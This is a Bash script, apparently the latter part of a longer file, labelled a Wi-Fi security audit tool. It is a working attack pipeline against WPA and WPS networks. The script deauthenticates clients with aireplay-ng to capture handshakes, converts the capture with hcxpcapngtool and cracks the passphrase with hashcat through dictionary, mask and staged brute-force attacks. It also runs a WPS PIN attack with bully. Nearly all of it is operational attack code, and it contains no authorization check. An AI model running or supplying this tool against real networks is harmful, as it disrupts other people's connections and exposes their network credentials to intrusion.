            log_warn "No wordlist provided. Dictionary/Combination attacks unavailable."
            FINAL_WORDLIST=""
        fi
    fi
}

# -----------------------------------------------------------------------------
# CLIENT SCANNING
# -----------------------------------------------------------------------------
get_connected_clients() {
    local custom_csv="${1:-}"
    local specific_csv="$TMP_DIR/$CLIENT_SCAN_PREFIX-01.csv"
    local initial_csv="$TMP_DIR/$SCAN_PREFIX-01.csv"
    local source_csv=""

    if [[ -n "$custom_csv" ]]; then
        local attempts=0
        while [[ ! -f "$custom_csv" ]] && ((attempts < 5)); do
            sleep 1
            ((++attempts))
        done
        [[ -f "$custom_csv" ]] && source_csv="$custom_csv"
    fi

    if [[ -z "$source_csv" ]]; then
        if   [[ -f "$specific_csv" ]]; then source_csv="$specific_csv"
        elif [[ -f "$initial_csv"  ]]; then source_csv="$initial_csv"
        else CONNECTED_CLIENTS=(); return
        fi
    fi

    mapfile -t CONNECTED_CLIENTS < <(gawk -F',' -v target="$TARGET_BSSID" '
        BEGIN { IGNORECASE = 1 }
        { gsub(/\r/, "") }
        /Station MAC/ { in_stations = 1; next }
        in_stations == 1 {
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $3)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6)

            last_seen_str = $3
            gsub(/[-:]/, " ", last_seen_str)
            last_seen_ts = mktime(last_seen_str)
            current_ts   = systime()

            if (last_seen_ts > 0 && (current_ts - last_seen_ts) > 60) next

            if (toupper($6) == toupper(target) &&
                $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
                printf "%s,%s\n", $1, $4
            }
        }
    ' "$source_csv" 2>/dev/null)
}

# =============================================================================
# GPU PIPELINE
# =============================================================================

# -----------------------------------------------------------------------------
# GPU HARDWARE PROBE
# -----------------------------------------------------------------------------
probe_gpu() {
    log_gpu "Probing GPU hardware..."

    if ! nvidia-smi &>/dev/null; then
        log_warn "nvidia-smi failed — NVIDIA driver may not be loaded."
        log_warn "GPU cracking unavailable; hashcat will fall back to CPU/OpenCL mode."
        GPU_AVAILABLE=0
        return 0
    fi

    GPU_AVAILABLE=1

    local gpu_name gpu_temp vram_total vram_free
    gpu_name=$(nvidia-smi  --query-gpu=name         --format=csv,noheader,nounits \
        2>/dev/null | head -n1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//') \
        || gpu_name="Unknown"
    gpu_temp=$(nvidia-smi  --query-gpu=temperature.gpu --format=csv,noheader,nounits \
        2>/dev/null | head -n1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//') \
        || gpu_temp=""
    vram_total=$(nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits \
        2>/dev/null | head -n1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//') \
        || vram_total="?"
    vram_free=$(nvidia-smi  --query-gpu=memory.free  --format=csv,noheader,nounits \
        2>/dev/null | head -n1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//') \
        || vram_free="?"

    log_gpu "Device : ${gpu_name}"
    log_gpu "VRAM   : ${vram_free} MiB free / ${vram_total} MiB total"
    log_gpu "Temp   : ${gpu_temp:-unknown}°C  (abort at ${GPU_TEMP_ABORT}°C)"

    if [[ -n "$gpu_temp" && "$gpu_temp" =~ ^[0-9]+$ ]]; then
        if ((gpu_temp >= GPU_TEMP_ABORT)); then
            die "GPU already at ${gpu_temp}°C — at or above abort threshold (${GPU_TEMP_ABORT}°C). Allow it to cool first."
        elif ((gpu_temp >= 75)); then
            log_warn "GPU pre-session temp is elevated (${gpu_temp}°C). Ensure ventilation is clear."
        fi
    fi

    local hashcat_info=""
    hashcat_info=$(hashcat -I 2>/dev/null) || true

    if printf '%s' "$hashcat_info" | grep -qi "cuda"; then
        CUDA_AVAILABLE=1
        log_gpu "CUDA backend  : ${GREEN}CONFIRMED${NC}"
    elif printf '%s' "$hashcat_info" | grep -qi "opencl"; then
        CUDA_AVAILABLE=0
        log_gpu "OpenCL backend: ${YELLOW}AVAILABLE (CUDA not found)${NC}"
    else
        log_warn "No GPU compute backend detected by hashcat. Will use CPU."
        GPU_AVAILABLE=0
        CUDA_AVAILABLE=0
    fi

    log_success "GPU probe complete."
}

# -----------------------------------------------------------------------------
# GPU THERMAL WATCHDOG
# -----------------------------------------------------------------------------
gpu_thermal_watchdog() {
    local sentinel_file="$1"

    ((GPU_AVAILABLE)) || return 0

    while true; do
        sleep 5

        [[ -f "$sentinel_file" ]] && return 0

        local temp=""
        temp=$(timeout 2s nvidia-smi --query-gpu=temperature.gpu \
            --format=csv,noheader,nounits 2>/dev/null \
            | head -n1 \
            | sed 's/^[[:space:]]*//;s/[[:space:]]*$//') || true

        [[ -z "$temp" || ! "$temp" =~ ^[0-9]+$ ]] && continue

        if ((temp >= GPU_TEMP_ABORT)); then
            printf '%s' "$temp" > "$sentinel_file"
            printf '\n%s[GPU]%s THERMAL ABORT: %s°C — stopping hashcat.\n' \
                "$MAGENTA" "$NC" "$temp" >&2
            pkill -SIGINT -x hashcat 2>/dev/null || true
            sleep 3
            pkill -SIGKILL -x hashcat 2>/dev/null || true
            return 0
        fi

        printf '%s[GPU]%s Thermal: %s°C / %s°C\n' \
            "$MAGENTA" "$NC" "$temp" "$GPU_TEMP_ABORT" >&2
    done
}

# -----------------------------------------------------------------------------
# PHASE 2 — HASH EXTRACTION
# -----------------------------------------------------------------------------
convert_cap_to_hc22000() {
    local cap_file="$1"

    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    HC22000_FILE="$TMP_DIR/${TARGET_ESSID_SAFE}_${timestamp}.hc22000"

    log_gpu "Phase 2: Hash Extraction"
    log_gpu "Input  : $cap_file"
    log_gpu "Output : $HC22000_FILE"
    log_info "Parsing 802.11 frames — extracting PMKID/EAPOL, stripping noise..."

    local hcx_output=""
    local hcx_exit=0
    hcx_output=$(hcxpcapngtool -o "$HC22000_FILE" "$cap_file" 2>&1) || hcx_exit=$?

    log_debug "hcxpcapngtool exit: $hcx_exit"
    log_debug "hcxpcapngtool output: $hcx_output"

    if [[ ! -f "$HC22000_FILE" || ! -s "$HC22000_FILE" ]]; then
        log_err "Hash extraction produced no output. Possible causes:"
        log_warn "  1. Client did not re-associate after deauth"
        log_warn "  2. Only a partial handshake was captured"
        log_warn "  3. Capture file is truncated or corrupt"
        log_info "hcxpcapngtool said:"
        printf '%s\n' "$hcx_output" | head -20 >&2
        HC22000_FILE=""
        return 1
    fi

    local hash_count
    hash_count=$(wc -l < "$HC22000_FILE")
    chown "$REAL_USER":"$REAL_GROUP" -- "$HC22000_FILE" 2>/dev/null || true
    log_success "Extracted ${hash_count} hash record(s) → $(basename "$HC22000_FILE")"

    local summary_line
    while IFS= read -r summary_line; do
        log_gpu "$summary_line"
    done < <(printf '%s\n' "$hcx_output" \
        | grep -E "^(PMKID|EAPOL|networks|summary|total)" 2>/dev/null || true)

    return 0
}

# -----------------------------------------------------------------------------
# ATTACK VECTOR SELECTION MENU
# -----------------------------------------------------------------------------
select_attack_vector() {
    printf '\n'                                                              >&2
    printf '%s╔══════════════════════════════════════╗%s\n' "$CYAN" "$NC"  >&2
    printf '%s║    GPU Attack Vector Selection       ║%s\n' "$CYAN" "$NC"  >&2
    printf '%s╚══════════════════════════════════════╝%s\n' "$CYAN" "$NC"  >&2
    printf '\n'                                                              >&2
    printf 'A) Rule-Based Dictionary Attack\n'                               >&2
    printf '   (-a 0 + wordlist + best64.rule)\n'                          >&2
    printf '   Best for: common passwords and their variations\n'          >&2
    printf '\n'                                                              >&2
    printf 'B) 8-Digit Numeric Brute Force\n'                               >&2
    printf '   (-a 3  ?d?d?d?d?d?d?d?d)\n'                                >&2
    printf '   Best for: ISP default PINs, phone numbers\n'                >&2
    printf '\n'                                                              >&2
    printf 'C) Custom Mask Brute Force\n'                                  >&2
    printf '   (-a 3, user-defined mask)\n'                                >&2
    printf '   Best for: known password structure\n'                       >&2
    printf '\n'                                                              >&2
    printf 'D) Combination Attack\n'                                       >&2
    printf '   (-a 1, two wordlists concatenated)\n'                       >&2
    printf '   Best for: compound passphrases (wordword patterns)\n'       >&2
    printf '\n'                                                              >&2
    printf 'E) Smart Sequential Brute Force (8-12 chars)\n'                >&2
    printf '   (Numbers first, then Lowercase+Num, Alphanumeric, then All/Special)\n'   >&2
    printf '   Uses dynamic .hcmask files for intelligent staging.\n'      >&2
    printf '\n'                                                              >&2

    local vector
    while true; do
        read -r -p "Select attack vector [A/B/C/D/E] (Default: A): " vector
        vector="${vector:-A}"
        vector="${vector^^}"
        case "$vector" in
            A|B|C|D|E) break ;;
            *) printf 'Invalid selection. Choose A, B, C, D, or E.\n' >&2 ;;
        esac
    done

    printf '%s' "$vector"
}

# -----------------------------------------------------------------------------
# PHASE 3 — HASHCAT GPU COMPUTE
# -----------------------------------------------------------------------------
run_hashcat() {
    local attack_vector="$1"

    if [[ -z "${HC22000_FILE:-}" || ! -s "${HC22000_FILE:-}" ]]; then
        log_err "No valid .hc22000 file. Cannot run hashcat."
        return 3
    fi

    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    HASHCAT_SESSION_NAME="wifi_${TARGET_ESSID_SAFE}_${timestamp}"
    HASHCAT_POTFILE="$TMP_DIR/${HASHCAT_SESSION_NAME}.pot"

    local thermal_sentinel="$TMP_DIR/thermal_${timestamp}.sentinel"

    local -a backend_flags=()

    if ((GPU_AVAILABLE && CUDA_AVAILABLE)); then
        backend_flags=("--backend-ignore-opencl" "-d" "1")
        log_gpu "Backend: CUDA (primary)"
    elif ((GPU_AVAILABLE)); then
        backend_flags=("--backend-ignore-cuda" "-D" "2")
        log_gpu "Backend: OpenCL GPU (fallback)"
    else
        backend_flags=("--backend-ignore-cuda")
        log_gpu "Backend: CPU/OpenCL fallback (CUDA unavailable)"
    fi

    local -a common_flags=(
        "-m"  "${HASHCAT_MODE}"
        "-w"  "${HASHCAT_WORKLOAD}"
        "--hwmon-temp-abort=${GPU_TEMP_ABORT}"
        "--potfile-path=${HASHCAT_POTFILE}"
        "--session=${HASHCAT_SESSION_NAME}"
        "--status"
        "--status-timer=10"
        "-O"
    )

    local -a attack_flags=()
    local attack_description=""

    case "$attack_vector" in
        A)
            if [[ -z "${FINAL_WORDLIST:-}" || ( ! -f "${FINAL_WORDLIST:-}" && ! -d "${FINAL_WORDLIST:-}" ) ]]; then
                log_err "Dictionary attack requires a wordlist or directory — none available."
                return 3
            fi

            local rules_file="${HASHCAT_RULES_DIR}/best64.rule"
            if [[ ! -f "$rules_file" ]]; then
                log_warn "best64.rule not found at default path — searching..."
                rules_file=$(find /usr /opt "$REAL_HOME" \
                    -name "best64.rule" -type f 2>/dev/null | head -n1) || true
            fi

            if [[ -n "${rules_file:-}" && -f "$rules_file" ]]; then
                attack_flags=("-a" "0" "-r" "$rules_file" "$HC22000_FILE" "$FINAL_WORDLIST")
                attack_description="Dictionary + best64.rule: $(basename "${FINAL_WORDLIST}")"
            else
                log_warn "No rules file found. Running pure dictionary (no mutations)."
                attack_flags=("-a" "0" "$HC22000_FILE" "$FINAL_WORDLIST")
                attack_description="Dictionary (no rules): $(basename "${FINAL_WORDLIST}")"
            fi
            ;;

        B)
            attack_flags=("-a" "3" "$HC22000_FILE" "?d?d?d?d?d?d?d?d")
            attack_description="8-digit numeric brute force (?d×8)"
            ;;

        C)
            printf '\n'                                                  >&2
            printf 'Mask charset reference:\n'                           >&2
            printf '  ?l = [a-z]   ?u = [A-Z]   ?d = [0-9]\n'            >&2
            printf '  ?s = special  ?a = all printable\n'                >&2
            printf 'Examples:\n'                                         >&2
            printf '  ?u?l?l?l?l?d?d?d   → Abcde123 style\n'             >&2
            printf '  ?d?d?d?d?d?d?d?d?d?d → 10-digit numeric\n'         >&2
            printf '\n'                                                  >&2

            local custom_mask=""
            read -r -p "Enter mask: " custom_mask

            if [[ -z "$custom_mask" ]]; then
                log_err "No mask entered. Skipping."
                return 3
            fi

            attack_flags=("-a" "3" "$HC22000_FILE" "$custom_mask")
            attack_description="Custom mask: $custom_mask"
            ;;

        D)
            if [[ -z "${FINAL_WORDLIST:-}" || ! -f "${FINAL_WORDLIST:-}" ]]; then
                log_err "Combination attack requires a single specific wordlist — none available."
                return 3
            fi

            printf '\n'                                                        >&2
            printf 'Combination: list1_word concatenated with list2_word.\n'  >&2
            printf 'Press ENTER to use the same wordlist for both halves.\n'  >&2
            printf '\n'                                                        >&2

            local second_wl="$FINAL_WORDLIST"
            local second_wl_input=""
            read -r -p "Path to second wordlist (ENTER = same as first): " second_wl_input

            if [[ -n "$second_wl_input" ]]; then
                if [[ -f "$second_wl_input" && -r "$second_wl_input" ]]; then
                    second_wl="$second_wl_input"
                else
                    log_warn "Second wordlist not readable. Using primary for both halves."
                fi
            fi

            attack_flags=("-a" "1" "$HC22000_FILE" "$FINAL_WORDLIST" "$second_wl")
            attack_description="Combination: $(basename "${FINAL_WORDLIST}") × $(basename "${second_wl}")"
            ;;
            
        E)
            local mask_file="$TMP_DIR/smart_sequential.hcmask"
            # Generating the mask file dynamically to stage the attack perfectly
            cat << 'EOF' > "$mask_file"
# Stage 1: Pure Digits (8 to 12 chars)
?d?d?d?d?d?d?d?d
?d?d?d?d?d?d?d?d?d
?d?d?d?d?d?d?d?d?d?d
?d?d?d?d?d?d?d?d?d?d?d
?d?d?d?d?d?d?d?d?d?d?d?d
# Stage 2: Lowercase + Digits (8 to 12 chars)
?l?d,?1?1?1?1?1?1?1?1
?l?d,?1?1?1?1?1?1?1?1?1
?l?d,?1?1?1?1?1?1?1?1?1?1
?l?d,?1?1?1?1?1?1?1?1?1?1?1
?l?d,?1?1?1?1?1?1?1?1?1?1?1?1
# Stage 3: Upper + Lower + Digits (8 to 12 chars)
?l?u?d,?1?1?1?1?1?1?1?1
?l?u?d,?1?1?1?1?1?1?1?1?1
?l?u?d,?1?1?1?1?1?1?1?1?1?1
?l?u?d,?1?1?1?1?1?1?1?1?1?1?1
?l?u?d,?1?1?1?1?1?1?1?1?1?1?1?1
# Stage 4: Everything (Alphanumeric + Special Characters) (8 to 12 chars)
?a?a?a?a?a?a?a?a
?a?a?a?a?a?a?a?a?a
?a?a?a?a?a?a?a?a?a?a
?a?a?a?a?a?a?a?a?a?a?a
?a?a?a?a?a?a?a?a?a?a?a?a
EOF
            attack_flags=("-a" "3" "$HC22000_FILE" "$mask_file")
            attack_description="Smart Sequential Brute Force (Mask File Strategy)"
            ;;
    esac

    printf '\n'
    log_gpu "╔══════════════════════════════════════════════╗"
    log_gpu "║            GPU Compute Session               ║"
    log_gpu "╚══════════════════════════════════════════════╝"
    log_gpu "Target ESSID : $TARGET_ESSID"
    log_gpu "Target BSSID : $TARGET_BSSID"
    log_gpu "Hash file    : $(basename "${HC22000_FILE}")"
    log_gpu "Hash mode    : -m ${HASHCAT_MODE}  (WPA-PBKDF2-PMKID+EAPOL)"
    log_gpu "Attack       : $attack_description"
    log_gpu "Workload     : -w ${HASHCAT_WORKLOAD}  (High / 96 ms kernel)"
    log_gpu "Temp limit   : ${GPU_TEMP_ABORT}°C  (watchdog + --hwmon-temp-abort)"
    log_gpu "Session      : ${HASHCAT_SESSION_NAME}"
    log_gpu "Potfile      : $(basename "${HASHCAT_POTFILE}")"
    printf '\n'
    log_info "Launching GPU compute pipeline..."
    log_info "Hashcat keys while running:  [s] status   [p] pause   [q] quit+checkpoint"
    printf '\n'

    gpu_thermal_watchdog "$thermal_sentinel" &
    local watchdog_pid=$!

    local hashcat_exit=0
    local -a hashcat_cmd=(
        hashcat
        "${backend_flags[@]}"
        "${common_flags[@]}"
        "${attack_flags[@]}"
    )

    log_debug "hashcat cmd: ${hashcat_cmd[*]}"

    "${hashcat_cmd[@]}" || hashcat_exit=$?

    kill "$watchdog_pid" 2>/dev/null || true
    wait "$watchdog_pid" 2>/dev/null || true
    printf '\n'

    if [[ -f "$thermal_sentinel" ]]; then
        local abort_temp
        abort_temp=$(<"$thermal_sentinel")
        log_err "Session terminated by thermal watchdog at ${abort_temp}°C."
        log_warn "Allow GPU to cool, then resume with:"
        log_warn "  hashcat --session=${HASHCAT_SESSION_NAME} --restore"
        return 2
    fi

    if [[ -f "$HASHCAT_POTFILE" && -s "$HASHCAT_POTFILE" ]]; then
        parse_and_display_result
        return 0
    fi

    log_debug "hashcat exit code: $hashcat_exit"
    case "$hashcat_exit" in
        0)
            log_warn "All candidates exhausted — password not found."
            log_info "Try a larger wordlist, broader mask, or additional rules."
            return 1
            ;;
        1)
            if [[ -f "$HASHCAT_POTFILE" && -s "$HASHCAT_POTFILE" ]]; then
                parse_and_display_result
                return 0
            fi
            log_warn "Hashcat reported a crack (exit 1) but potfile is empty."
            return 1
            ;;
        2)
            log_info "Session paused/quit by user."
            log_info "Resume with: hashcat --session=${HASHCAT_SESSION_NAME} --restore"
            return 1
            ;;
        255)
            log_err "Hashcat fatal error (exit 255) — check GPU drivers, CUDA, and hash file."
            return 1
            ;;
        *)
            log_warn "Hashcat exited with code $hashcat_exit — password not in potfile."
            return 1
            ;;
    esac
}

# -----------------------------------------------------------------------------
# RESULT DISPLAY
# -----------------------------------------------------------------------------
parse_and_display_result() {
    if [[ ! -f "$HASHCAT_POTFILE" || ! -s "$HASHCAT_POTFILE" ]]; then
        log_warn "Potfile is empty or missing."
        return 1
    fi

    local cracked_key
    cracked_key=$(awk '{
        idx = index($0, ":")
        if (idx > 0) print substr($0, idx + 1)
    }' "$HASHCAT_POTFILE" | head -n1)

    if [[ -z "$cracked_key" ]]; then
        log_warn "Could not parse passphrase from potfile."
        log_info "Raw potfile:"
        cat "$HASHCAT_POTFILE" >&2
        return 1
    fi

    local gpu_stats=""
    if ((GPU_AVAILABLE)); then
        gpu_stats=$(nvidia-smi \
            --query-gpu=utilization.gpu,temperature.gpu,clocks.current.sm \
            --format=csv,noheader 2>/dev/null | head -n1) || true
    fi

    printf '\n'
    printf '%s%s' "$GREEN" "$BOLD"
    printf '╔══════════════════════════════════════════════╗\n'
    printf '║                                              ║\n'
    printf '║            PASSWORD CRACKED !!!              ║\n'
    printf '║                                              ║\n'
    printf '╚══════════════════════════════════════════════╝\n'
    printf '%s\n' "$NC"
    printf '\n'
    printf '%sNetwork   :%s %s\n'      "$CYAN$BOLD"  "$NC" "$TARGET_ESSID"
    printf '%sBSSID     :%s %s\n'      "$CYAN$BOLD"  "$NC" "$TARGET_BSSID"
    printf '%sPASSPHRASE:%s %s%s%s\n' "$GREEN$BOLD"  "$NC" \
                                       "$YELLOW$BOLD" "$cracked_key" "$NC"
    printf '\n'

    if [[ -n "$gpu_stats" ]]; then
        printf '%sGPU stats :%s %s\n' "$MAGENTA" "$NC" "$gpu_stats"
        printf '\n'
    fi

    if copy_to_clipboard "$cracked_key"; then
        log_success "Passphrase copied to clipboard!"
    fi

    log_info "Session artifacts saved to: $HANDSHAKE_DIR"
    return 0
}

# =============================================================================
# WPA HANDSHAKE CAPTURE + GPU CRACK
# =============================================================================
attack_wpa_handshake_gpu() {
    local attack_vector
    attack_vector=$(select_attack_vector)
    log_info "Attack vector selected: $attack_vector"

    if [[ "$attack_vector" == "A" || "$attack_vector" == "D" ]]; then
        prepare_wordlist "$attack_vector"
    fi

    if [[ -z "${FINAL_WORDLIST:-}" || ( ! -f "${FINAL_WORDLIST:-}" && ! -d "${FINAL_WORDLIST:-}" ) ]]; then
        if [[ "$attack_vector" == "A" || "$attack_vector" == "D" ]]; then
            log_warn "No valid wordlist/directory available. Dictionary and Combination attacks disabled."
        fi
        log_info "Mask attacks (B, C, E) do not require a wordlist."
    fi

    while true; do
        local timestamp
        timestamp=$(date +%Y%m%d_%H%M%S)
        local capture_base="${HANDSHAKE_DIR}/${TARGET_ESSID_SAFE}_${timestamp}"
        local record_cmd="sudo airodump-ng -c ${TARGET_CH} --bssid ${TARGET_BSSID} -w '${capture_base}' --write-interval 1 ${MON_IFACE}"

        printf '\n'
        log_info "Step 1: Handshake Capture"
        printf '1. The %scapture command%s has been prepared.\n' "$CYAN" "$NC"
        printf '2. Open a new terminal.\n'
        printf '3. Paste and run it.\n'
        printf '4. Return here and press ENTER.\n\n'

        if copy_to_clipboard "$record_cmd"; then
            log_success "Command copied to clipboard!"
        else
            log_warn "Clipboard unavailable. Copy manually:"
            printf '%s\n' "$record_cmd"
        fi

        read -r -p "Press ENTER when recorder is running..."

        local target_mac=""
        local user_capture_csv="${capture_base}-01.csv"

        while true; do
            while true; do
                get_connected_clients "$user_capture_csv"

                printf '\nTarget Selection:\n'
                printf '1) Broadcast Deauth (Kick Everyone)\n'

                local c=2
                if ((${#CONNECTED_CLIENTS[@]} > 0)); then
                    local client mac pwr
                    for client in "${CONNECTED_CLIENTS[@]}"; do
                        IFS=',' read -r mac pwr <<< "$client"
                        printf '%d) Specific Client: %s (Signal: %s dBm)\n' \
                            "$c" "$mac" "${pwr:-?}"
                        ((c++))
                    done
                else
                    printf '   (No connected clients detected yet)\n'
                fi

                printf 'r) Refresh Client List\n'

                local sel
                read -r -p "Select Target [1-$((c-1))] or 'r' (Default 1): " sel
                sel="${sel:-1}"

                if [[ "${sel,,}" == "r" ]]; then
                    log_info "Reloading client data from capture file..."
                    sleep 0.5
                    continue
                fi

                if [[ "$sel" =~ ^[0-9]+$ ]]; then
                    if ((sel == 1)); then
                        log_info "Targeting Broadcast (All Clients)"
                        target_mac=""
                        break

                    elif ((sel > 1 && sel < c)); then
                        local client_idx=$((sel - 2))
                        local selected_line="${CONNECTED_CLIENTS[client_idx]}"
                        local raw_mac="${selected_line%%,*}"
                        target_mac="${raw_mac//[^0-9A-Fa-f:]/}"

                        if [[ "$target_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                            log_info "Targeting specific client: $target_mac"
                            break
                        else
                            log_warn "Invalid MAC parsed. Try refreshing."
                        fi
                    else
                        log_err "Invalid selection."
                    fi
                else
                    log_err "Invalid selection."
                fi
            done

            printf '\n'
            log_info "Step 2: Sending Deauth Packets"

            while true; do
                local burst=1
                log_info "Sending $burst group(s) of deauth packets..."

                if [[ -n "$target_mac" ]]; then
                    timeout --signal=SIGTERM 30s \
                        aireplay-ng -0 "$burst" -a "$TARGET_BSSID" \
                        -c "$target_mac" -- "$MON_IFACE" || true
                else
                    timeout --signal=SIGTERM 30s \
                        aireplay-ng -0 "$burst" -a "$TARGET_BSSID" \
                        -- "$MON_IFACE" || true
                fi

                printf '\n'
                log_success "Deauth burst complete."
                printf "Check recorder terminal for: 'WPA handshake: %s'\n" "$TARGET_BSSID"

                while true; do
                    printf '\nOptions:\n'
                    printf 'y) Handshake captured — start GPU cracking pipeline\n'
                    printf 'n) Abort this attack\n'
                    printf 'r) Retry deauth (send more packets)\n'
                    printf 'b) Back to client selection\n'
                    printf 't) Back to target (network) selection\n'

                    local cap_choice
                    read -r -p "Choice [y/n/r/b/t] (Default: r): " cap_choice
                    cap_choice="${cap_choice:-r}"

                    case "${cap_choice,,}" in
                        y) break 3 ;;
                        n) log_info "Attack aborted."; return 0 ;;
                        b) break 2 ;;
                        t) return 2 ;;
                        r) break  ;;
                        *) log_warn "Invalid option. Try again." ;;
                    esac
                done
            done
        done

        local cap_file="${capture_base}-01.cap"

        if [[ ! -f "$cap_file" ]]; then
            local found_cap
            found_cap=$(find "$HANDSHAKE_DIR" -maxdepth 1 \
                -name "${TARGET_ESSID_SAFE}_${timestamp}*.cap" \
                -type f 2>/dev/null | head -n1) || true
            [[ -n "${found_cap:-}" ]] && cap_file="$found_cap"
        fi

        if [[ -f "$cap_file" ]]; then
            chown "$REAL_USER":"$REAL_GROUP" -- "${capture_base}"* 2>/dev/null || true
            log_info "Capture file ownership transferred to $REAL_USER."
        else
            log_err "Capture file not found: $cap_file"
            printf '\nOptions:\n'
            printf 'r) Retry capture\n'
            printf 'x) Exit this attack\n'
            local no_cap_choice
            read -r -p "Selection [r/x] (Default: r): " no_cap_choice
            no_cap_choice="${no_cap_choice:-r}"
            [[ "${no_cap_choice,,}" == "x" ]] && return 0
            continue
        fi

        while true; do
            printf '\n'
            log_info "Step 3: GPU Compute Pipeline"

            if ! convert_cap_to_hc22000 "$cap_file"; then
                printf '\nHash extraction failed.\n'
                printf 'Options:\n'
                printf 'r) Retry capture (send more deauths)\n'
                printf 'x) Exit this attack\n'

                local extract_choice
                read -r -p "Selection [r/x] (Default: r): " extract_choice
                extract_choice="${extract_choice:-r}"

                if [[ "${extract_choice,,}" == "x" ]]; then
                    return 0
                else
                    HC22000_FILE=""
                    continue 2
                fi
            fi

            local crack_result=0
            run_hashcat "$attack_vector" || crack_result=$?

            case "$crack_result" in
                0)
                    return 0
                    ;;
                2)
                    printf '\n'
                    log_err "Compute session aborted — GPU thermal limit reached."
                    log_info "Allow GPU to cool, then resume with:"
                    log_info "  hashcat --session=${HASHCAT_SESSION_NAME} --restore"
                    read -r -p "Press ENTER to return to the main menu..."
                    return 0
                    ;;
                3)
                    log_info "Cracking skipped. Hash file: ${HC22000_FILE}"
                    log_info "To crack later:"
                    log_info "  hashcat -m ${HASHCAT_MODE} -w ${HASHCAT_WORKLOAD} \\"
                    log_info "    '${HC22000_FILE}' /path/to/wordlist.txt"
                    return 0
                    ;;
                1|*)
                    printf '\n'
                    log_warn "Password not found with vector: $attack_vector"
                    printf 'Options:\n'
                    printf 'a) Try a different attack vector (reuse same .hc22000)\n'
                    printf 'r) Re-capture handshake (full restart)\n'
                    printf 'x) Exit this attack\n'

                    local retry_choice
                    read -r -p "Selection [a/r/x] (Default: a): " retry_choice
                    retry_choice="${retry_choice:-a}"

                    case "${retry_choice,,}" in
                        a)
                            attack_vector=$(select_attack_vector)
                            log_info "New attack vector: $attack_vector"
                            if [[ ( "$attack_vector" == "A" || "$attack_vector" == "D" ) \
                                  && ( -z "${FINAL_WORDLIST:-}" || ( ! -f "${FINAL_WORDLIST:-}" && ! -d "${FINAL_WORDLIST:-}" ) ) ]]; then
                                log_info "New attack requires a wordlist — preparing now."
                                prepare_wordlist "$attack_vector"
                            fi
                            continue
                            ;;
                        r)
                            HC22000_FILE=""
                            HASHCAT_POTFILE=""
                            continue 2
                            ;;
                        *)
                            return 0
                            ;;
                    esac
                    ;;
            esac
        done
    done
}

# -----------------------------------------------------------------------------
# ATTACK: WPS
# -----------------------------------------------------------------------------
attack_wps() {
    log_info "Starting WPS scan via 'wash'..."
    timeout --signal=SIGTERM 15s wash -i "$MON_IFACE" 2>/dev/null \
        | grep -i -- "$TARGET_BSSID" || true

    log_info "Attempting WPS attack via 'bully'..."
    log_warn "This may take a very long time. Press Ctrl+C to abort."
    bully -b "$TARGET_BSSID" -c "$TARGET_CH" -v 3 -- "$MON_IFACE" || {
        log_warn "Bully exited with error or was interrupted."
    }
}

# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
main() {
    printf '==============================================\n'
    printf '   Arch/Hyprland Wi-Fi Security Audit\n'
    printf '   GPU-Accelerated Pipeline Edition\n'
    printf '==============================================\n'
    printf 'Version: 3.1.4 | PID: %d\n' "$$"
    printf '\n'

    check_deps
    probe_gpu
    setup_directories
    select_interface
    enable_monitor_mode

    while true; do
        scan_targets

        local should_rescan=0
        while true; do
            printf '\n'
            printf 'Select Attack Vector:\n'
            printf '1) WPA Handshake Capture + GPU Crack  [hcxpcapngtool → hashcat -m 22000]\n'
            printf '2) WPS Attack (Bully)\n'
            printf '3) Rescan Targets\n'
            printf '4) Exit\n'

            local attack_choice
            read -r -p "Choice [1]: " attack_choice
            attack_choice="${attack_choice:-1}"

            case "$attack_choice" in
                1)
                    local result=0
                    attack_wpa_handshake_gpu || result=$?
                    if ((result == 2)); then
                        log_info "Returning to network scan..."
                        should_rescan=1
                    fi
                    break
                    ;;
                2)  attack_wps; break ;;
                3)  log_info "Restarting scan..."; should_rescan=1; break ;;
                4)  log_info "Exiting."; exit 0 ;;
                *)  log_err "Invalid choice." ;;
            esac
        done

        ((should_rescan)) && continue
        break
    done

    printf '\n'
    read -r -p "Press ENTER to cleanup and exit..."
}

main "$@"
